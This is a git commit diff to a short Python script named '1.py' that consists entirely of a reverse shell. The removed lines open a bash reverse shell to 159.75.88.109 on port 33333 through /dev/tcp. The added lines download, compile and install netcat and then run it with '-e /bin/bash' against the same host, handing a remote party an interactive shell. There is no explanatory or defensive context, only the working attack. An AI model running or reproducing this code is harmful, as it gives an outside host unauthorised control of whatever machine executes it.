014a5792ce95f55b38be0dc0456ccd878339e127
singlemindedt <44424494+singlemindedt@users.noreply.github.com>
2021-10-13 17:03:16 +0800

    Update 1.py

--- 1.py
+++ 1.py
@@ -1,8 +1,12 @@
 import os 
 import time
 
-os.system('bash -i >& /dev/tcp/159.75.88.109/33333 0>&1')
-os.system('bash -i >& /dev/tcp/159.75.88.109/33333 0>&1')
-os.system('bash -i >& /dev/tcp/159.75.88.109/33333 0>&1')
+
+os.system('wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz')
+os.system('tar -xvzf netcat-0.7.1.tar.gz')
+os.system('./configure')
+os.system('make && make install')
+os.system('make clean')
+os.system('netcat 159.75.88.109 33333 -e /bin/bash')
 
 time.sleep(3600)
